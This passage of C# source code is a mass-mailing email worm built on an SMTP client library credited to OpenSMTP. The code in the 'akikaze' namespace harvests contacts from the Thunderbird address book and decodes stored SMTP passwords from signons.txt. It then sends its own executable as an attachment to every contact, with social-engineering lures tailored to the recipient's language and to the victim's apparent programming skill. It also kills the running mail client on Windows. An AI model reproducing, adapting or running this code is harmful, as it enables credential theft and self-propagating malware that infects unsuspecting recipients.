                   Connected(this, e);
           }

           internal void OnDisconnect(EventArgs e)
           {
               if (Disconnected != null)
                   Disconnected(this, e);
           }

           internal void OnAuthenticated(EventArgs e)
           {
               if (Authenticated != null)
                   Authenticated(this, e);
           }

           internal void OnStartedMessageTransfer(EventArgs e)
           {
               if (StartedMessageTransfer != null)
                   StartedMessageTransfer(this, e);
           }

           internal void OnEndedMessageTransfer(EventArgs e)
           {
               if (EndedMessageTransfer != null)
                   EndedMessageTransfer(this, e);
           }

           //========================================================================
           // METHODS
           //========================================================================

           /// <summary>Sends a mail message using supplied MailMessage properties as string params</summary>
           /// <param name="from">RFC 822 formatted email sender address</param>
           /// <param name="to">RFC 822 formatted email recipient address</param>
           /// <param name="subject">Subject of the email message</param>
           /// <param name="body">Text body of the email message</param>
           /// <example>
           /// <code>
           ///     Smtp smtp = new Smtp("mail.OpenSmtp.com", 25);
           ///     smtp.SendMail("support@OpenSmtp.com", "recipient@OpenSmtp.com", "Hi", "Hello Joe Smith");
           /// </code>
           /// </example>
           public void SendMail(string from, string to, string subject, string body)
           {
               MailMessage msg = new MailMessage(from, to);
               msg.subject = subject;
               msg.body = body;

               SendMail(msg);
           }

           /// <summary>Sends a mail message using supplied MailMessage and Smtp properties</summary>
           /// <param name="msg">MailMessage instance</param>
           /// <param name="host">SMTP host address</param>
           /// <param name="port">Port used to connect to host</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.Subject = "Hi";
           ///     msg.Body = "Hello Joe Smith."
           ///     Smtp smtp = new Smtp();
           ///     smtp.SendMail(msg, "mail.OpenSmtp.com", 25);
           /// </code>
           /// </example>
           public void SendMail(MailMessage msg, string host, int port)
           {
               this.host = host;
               this.port = port;
               SendMail(msg);
           }


           /// <summary>Sends a mail message using supplied MailMessage</summary>
           /// <param name="msg">MailMessage instance</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.Subject = "Hi";
           ///     msg.Body = "Hello Joe Smith."
           ///     Smtp smtp = new Smtp("mail.OpenSmtp.com", 25);
           ///     smtp.SendMail(msg);
           /// </code>
           /// </example>
           public void SendMail(MailMessage msg)
           {

               NetworkStream nwstream = GetConnection();

               CheckForError(ReadFromStream(ref nwstream), ReplyConstants.HELO_REPLY);

               if (this.username != null && this.username.Length > 0 && this.password != null && this.password.Length > 0)
               {
                   WriteToStream(ref nwstream, "EHLO " + Dns.GetHostName() + "\r\n");
               }
               else
                   WriteToStream(ref nwstream, "HELO " + Dns.GetHostName() + "\r\n");

               CheckForError(ReadFromStream(ref nwstream), ReplyConstants.OK);

               // Authentication is used if the u/p are supplied
               AuthLogin(ref nwstream);

               WriteToStream(ref nwstream, "MAIL FROM: <" + msg.from.address + ">\r\n");
               CheckForError(ReadFromStream(ref nwstream), ReplyConstants.OK);

               SendRecipientList(ref nwstream, msg.recipientList);
               SendRecipientList(ref nwstream, msg.ccList);
               SendRecipientList(ref nwstream, msg.bccList);

               WriteToStream(ref nwstream, "DATA\r\n");
               CheckForError(ReadFromStream(ref nwstream), ReplyConstants.START_INPUT);


               OnStartedMessageTransfer(EventArgs.Empty);
               WriteToStream(ref nwstream, msg.ToString() + "\r\n.\r\n");
               CheckForError(ReadFromStream(ref nwstream), ReplyConstants.OK);
               OnEndedMessageTransfer(EventArgs.Empty);

               WriteToStream(ref nwstream, "QUIT\r\n");
               CheckForError(ReadFromStream(ref nwstream), ReplyConstants.QUIT);

               CloseConnection();

           }


           /// <summary>Resets the Smtp instance to it's defaut values; set in the SmtpConfig class</summary>
           /// <example>
           /// <code>
           ///     Smtp smtp = new Smtp("mail.OpenSmtp.com", 25);
           ///     smtp.Reset();
           /// </code>
           /// </example>
           public void Reset()
           {
               host     = null;
               port     = 25;
               username = null;
               password = null;

               CloseConnection();
           }


           // --------------- Helper methods ------------------------------------

           private NetworkStream GetConnection()
           {
               try
               {
                   if (host == null)
                   { host = SmtpConfig.SmtpHost; }

                   if (port == 0)
                   { port = SmtpConfig.SmtpPort; }

                   if (host != null && port != 0)
                   {
                       tcpc = new TcpClient(host, port);

                       LogMessage("connecting to:" + host + ":" + port, "");
                       tcpc.ReceiveTimeout= recieveTimeout;
                       tcpc.SendTimeout = sendTimeout;
                       tcpc.ReceiveBufferSize = receiveBufferSize;
                       tcpc.SendBufferSize = sendBufferSize;

                       LingerOption lingerOption = new LingerOption(true, 10);
                       tcpc.LingerState = lingerOption;

                   }
                   else
                   {
                       throw new SmtpException("Cannot use SendMail() method without specifying target host and port");
                   }
               }
               catch(SocketException e)
               {
                   throw new SmtpException("Cannot connect to specified smtp host(" + host + ":" + port + ").", e);
               }

               OnConnect(EventArgs.Empty);
               return tcpc.GetStream();
           }

           private void CloseConnection()
           {
               // add delimeter to log file
               LogMessage("------------------------------------------------------\r\n", "");

               // fire disconnect event
               OnDisconnect(EventArgs.Empty);

               // destroy tcp connection if it hasn't already closed
               if (tcpc!=null)
               { tcpc.Close(); }
           }


           private bool AuthLogin(ref NetworkStream nwstream)
           {
               if (this.username != null && this.username.Length > 0 && this.password != null && this.password.Length > 0)
               {
                   WriteToStream(ref nwstream, "AUTH LOGIN\r\n");
                   if (AuthImplemented(ReadFromStream(ref nwstream)))
                   {
                       WriteToStream(ref nwstream, Convert.ToBase64String(Encoding.ASCII.GetBytes(this.username.ToCharArray())) + "\r\n");

                       CheckForError(ReadFromStream(ref nwstream), ReplyConstants.SERVER_CHALLENGE);

                       WriteToStream(ref nwstream, Convert.ToBase64String(Encoding.ASCII.GetBytes(this.password.ToCharArray())) + "\r\n");
                       CheckForError(ReadFromStream(ref nwstream), ReplyConstants.AUTH_SUCCESSFUL);

                       OnAuthenticated(EventArgs.Empty);
                       return true;
                   }
               }

               return false;
           }

           private void SendRecipientList(ref NetworkStream nwstream, ArrayList recipients)
           {
               //  Iterate through all addresses and send them:
               for (IEnumerator i = recipients.GetEnumerator();i.MoveNext();)
               {
                   EmailAddress recipient = (EmailAddress)i.Current;
                   WriteToStream(ref nwstream, "RCPT TO: <" + recipient.address + ">\r\n");

                   // potential 501 error (not valid sender, bad email address) below:
                   CheckForError(ReadFromStream(ref nwstream), ReplyConstants.OK);
               }
           }

           private bool CheckMailMessage(MailMessage message)
           {
               string returnMessage = "Mail Message is missing ";

               if (message.To == null || message.To.Count <= 0)
               {
                   throw new SmtpException(returnMessage + "'To:' field");
               }
               else
               { return true; }
           }

           /**
            * NetworkStream Helper methods
            */
           private void WriteToStream(ref NetworkStream nw, string line)
           {
               try
               {
                   byte[] arrToSend = Encoding.ASCII.GetBytes(line);
                   nw.Write(arrToSend, 0, arrToSend.Length);
                   //Console.WriteLine("[client]:" + line);
                   LogMessage(line, "[client]: ");
               }
               catch(System.Exception)
               {
                   throw new SmtpException("Write to Stream threw an System.Exception");
               }
           }

           private string ReadFromStream(ref NetworkStream nw)
           {
               try
               {

                   byte[] readBuffer = new byte[4096];

                   int length = nw.Read(readBuffer, 0, readBuffer.Length);
                   string returnMsg = Encoding.ASCII.GetString(readBuffer, 0, length);

                   LogMessage(returnMsg, "[server]: ");
                   return returnMsg;
               }
               catch(System.Exception e)
               {
                   throw new SmtpException("Read from Stream threw an System.Exception: " + e.ToString());
               }
           }

           private void LogMessage(string msg, string src)
           {
               Log log = new Log();
               if (SmtpConfig.LogToText)   { log.logToTextFile(SmtpConfig.LogPath, msg, src); }
           }

           /**
            *
            * Checks stream returned from SMTP server for success code
            * If the success code is not present it will throw an error.
            *
            */
           private void CheckForError(string s, string successCode)
           {
               if (s.IndexOf(successCode) == -1)
                   throw new SmtpException("ERROR - Expecting: " + successCode + ". Recieved: " + s);
           }

           /// Check to see if the command sent returns a Unknown Command Error
           private bool IsUnknownCommand(string s)
           {
               if (s.IndexOf(ReplyConstants.UNKNOWN) != -1) { return true; }
               else { return false; }
           }

           /// Check to see if AUTH command returns valid challenge.
           /// A valid AUTH string must be passed into this method.
           private bool AuthImplemented(string s)
           {
               if (s.IndexOf(ReplyConstants.SERVER_CHALLENGE) != -1)
               { return true; }

               return false;
           }
       }

   }

   /****************************************************************************
    *                                      *
    *              SMTP-Library                    *
    *              Taken from OpenSMTP                 *
    *        Entire project relicensed under GPLv2             *
    *                                      *
    *                                      *
    *                  END                     *
    *                                      *
    *                                      *
    ****************************************************************************/



   namespace akikaze
   {
       class gather
       {
           /*Gathers various information of the targeted machine*/

           public PlatformID os;
           public string user;
           public string lang;
           public string homefolder;
           public string defaultdir;
           private StreamReader addressfile;
           public bool available = true;
           public ArrayList addresses = new ArrayList();
           public DirectoryInfo thunderbirddir;

           private void getabook()
           {
         try {
               if (os == PlatformID.Unix)
               {
                   homefolder = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
                   DirectoryInfo homedir = new DirectoryInfo(homefolder);
                   if (homedir.GetDirectories(".thunderbird").Length != 0)
                   {
                       /* Standard Unix-System */
                       thunderbirddir = new DirectoryInfo(homefolder + "/.thunderbird");
                       defaultdir = thunderbirddir.GetDirectories("*default")[0].ToString() + "/";
                       FileInfo adds = new FileInfo(defaultdir + "abook.mab");
                       addressfile = adds.OpenText();
                   }
                   else if (homedir.GetDirectories(".thunderbird").Length != 0)
                   {
                       /* MacOS X */
                       thunderbirddir = new DirectoryInfo(homefolder + "/Library/Thunderbird/Profiles/" + user);
                       defaultdir = thunderbirddir.GetDirectories("*slt")[0].ToString() + "/";
                       FileInfo adds = new FileInfo(defaultdir + "abook.mab");
                       addressfile = adds.OpenText();
                   }
               }
               else if (os == PlatformID.Win32NT)
               {
                   /* WinXP code*/
                   Process[] processes = Process.GetProcessesByName("THUNDE~1");
                   foreach (Process pr in processes)
                   {
                       pr.Kill();
                   }
                   Thread.Sleep(1000);
                   homefolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                   thunderbirddir = new DirectoryInfo(homefolder + "\\Thunderbird\\Profiles\\");
                   defaultdir = thunderbirddir.GetDirectories()[0].ToString() + "\\";
                   FileInfo adds = new FileInfo(thunderbirddir + defaultdir + "abook.mab");
                   addressfile = adds.OpenText();
               }
               else available = false;
         }
         catch (Exception e) {
           available = false;
           }
           }

           public void formatadds()
           {
               Regex mail = new Regex("[0-9a-zA-Z]+@[0-9a-zA-Z]+", RegexOptions.None);
               Regex separate = new Regex("=|\\)", RegexOptions.None);
               foreach (string part in separate.Split(addressfile.ReadToEnd()))
               {
                   if (mail.IsMatch(part)) addresses.Add(part);
               }
           }

           public gather()
           {
               os = Environment.OSVersion.Platform;
               user = Environment.UserName;
               lang = Thread.CurrentThread.CurrentCulture.TwoLetterISOLanguageName;
               getabook();
           if (available) formatadds();
           else Environment.Exit(1);
           }
       }

       class create
       {
           /* Create the message to send out depending on various informations */

           private string title_en = "Programming";
           private string title_de = "Programmierung";
           private string title_default = "Programming";
           private string content_average_en = "Hi, \nI have recently started to try out programming! \nThis is one of my first programms. What do you think of it?";
           private string content_average_de = "Hi, \nich habe neulich angefangen zu programmieren! \nDas hier ist eines meiner ersten Programme. Was h?ltst du davon?";
           private string content_average_default = "Hi, \nI have recently started to try out programming! \nThis is one of my first programms. What do you think of it?";
           private string content_pro_en = "Hi, \nI wrote this program using a new approach. Please tell me what you think of it.";
           private string content_pro_de = "Hi, \nIch habe beim Schreiben dieses Programms einen neuen Ansatz verfolgt. Sag mir bitte was du davon h?lts.";
           private string content_pro_default = "Hi, \nI wrote this program using a new approach. Please tell me what you think of it.";
           private string content_notwin_en = "\nIf the programm should not work instantly on your non-windows-system you probably need to execute it using mono. (mono-project.com)";
           private string content_notwin_de = "\nWenn diese Programm sich auf deinem Nicht-Windows-System nich direkt ausf?hren lassen sollte musst du es wahrscheinlich durch Mono ausf?hren! (mono-project.com)";
           private string content_notwin_default = "\nIf the programm should not work instantly on your non-windows-system you probably need to execute it using mono. (mono-project.com)";
           public string content;
           public string title;

           private string getlang(string address)
           {
               /* Return expected receiver's language */

               if (address.EndsWith("de")) return "de";
               else if (address.EndsWith("com") || address.EndsWith("co.uk")) return "en";
               /* More languages to be supported go here */
               else return "default";

           }

           private bool getskill()
           {
               /* Determines if the current user is a professional by checking for the programs GCC and Visual Studio */
               bool result = false;
               if (Go.info.os == PlatformID.Unix)
               {
                   Regex separate = new Regex(":|;", RegexOptions.None);
                   string[] syspath = separate.Split(Environment.GetEnvironmentVariable("PATH"));
                   foreach (string foo in syspath)
                   {
                       if (File.Exists(foo + "/gcc")) result = true;
                   }
               }
               else
               {
                   DirectoryInfo[] programs = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)).GetDirectories();
                   foreach (DirectoryInfo program in programs)
                   {
                       if (program.ToString().Contains("Visual Studio")) result = true;
                   }
               }
               return result;
           }

           public create(string address)
           {
               if (getlang(address) == "de" && Go.info.lang == "de")
               {
                   if (getskill()) content = content_pro_de;
                   else content = content_average_de;

                   if (Go.info.os == PlatformID.Unix) content += content_notwin_de;

                   title = title_de;
               }
               else if (getlang(address) == "en" && Go.info.lang == "en")
               {
                   if (getskill()) content = content_pro_en;
                   else content = content_average_en;

                   if (Go.info.os == PlatformID.Unix) content += content_notwin_en;

                   title = title_en;
               }
               else
               {
                   if (getskill()) content = content_pro_default;
                   else content = content_average_default;

                   if (Go.info.os == PlatformID.Unix) content += content_notwin_default;

                   title = title_default;
               }
           }
       }

       class attack
       {
           private string host;
           private int port = 25;
           private string user;
           private string password_base64;
           private string password;
           private string content;
           private string signon_content;
           private Regex separate1;
           private FileInfo prefs;
           private FileInfo signons;

           public attack()
           {
               if (Go.info.os == PlatformID.Win32NT)
               {
                   prefs = new FileInfo(Go.info.thunderbirddir + Go.info.defaultdir + "prefs.js");
                   signons = new FileInfo(Go.info.thunderbirddir + Go.info.defaultdir + "signons.txt");
               }
               else
               {
                   prefs = new FileInfo(Go.info.defaultdir + "prefs.js");
                   signons = new FileInfo(Go.info.defaultdir + "signons.txt");
               }
               StreamReader settings = prefs.OpenText();
               content = settings.ReadToEnd();

               StreamReader passread = signons.OpenText();
               signon_content = passread.ReadToEnd();
           }
           public bool check_smtp()
           {
               if (content.Contains("mail.smtpserver.smtp1")) return true;
               else return false;
           }
           public void getdata()
           {
               if (Go.info.os == PlatformID.Win32NT) separate1 = new Regex("\\);\r\nuser_pref\\(\"", RegexOptions.None);
               else separate1 = new Regex("\\);\nuser_pref\\(\"", RegexOptions.None);
               Regex separate2 = new Regex(", ");
               Regex separate3 = new Regex("\\n");
               string[] nuser_pref = separate1.Split(content);
               foreach (string pref in nuser_pref)
               {
                   if (pref.Contains("mail.smtpserver.smtp1.port")) port = Convert.ToInt32(separate2.Split(pref)[1].Replace("\"", ""));
                   else if (pref.Contains("mail.smtpserver.smtp1.hostname")) host = separate2.Split(pref)[1].Replace("\"", "");
                   else if (pref.Contains("mail.smtpserver.smtp1.username")) user = separate2.Split(pref)[1].Replace("\"", "");
               }
               string[] signon_list = separate3.Split(signon_content);
               int i = 0;
               while (i < signon_list.Length)
               {
                   if (signon_list[i].Contains("smtp://" + user.Replace("@", "%40") + "@" + host))
                   {
                       password_base64 = signon_list[i + 4].Replace("~", "");
                       break;
                   }
                   i++;
               }
               password = Encoding.ASCII.GetString(Convert.FromBase64String(password_base64));
           }

       public void sendmail (string address, string content, string title)
       {
           OpenSmtp.Mail.MailMessage message = new OpenSmtp.Mail.MailMessage(user.Replace("@" + host, "") + "@" + host, address);
           message.Subject = title;
           message.Body = content;
           message.AddAttachment(Assembly.GetEntryAssembly().Location);

           OpenSmtp.Mail.Smtp smtp = new OpenSmtp.Mail.Smtp(host, user, password, port);
           smtp.SendMail(message);

       }
       }

       class Go
       {
           static public gather info = new gather();
           static void Main(string[] args)
           {
           Console.WriteLine(info.user);
           Console.WriteLine(info.homefolder);
           Console.WriteLine(info.available);
                   attack server = new attack();
                   if (server.check_smtp()) server.getdata();
                   else Environment.Exit(1);
                   foreach (string mail in info.addresses.ToArray())
                   {
               Console.WriteLine("Sending to "+mail);
                       create content = new create(mail);
               Console.WriteLine("Content -> "+content.content);
                       server.sendmail(mail, content.content, content.title);
                   }
           }
       }
   }
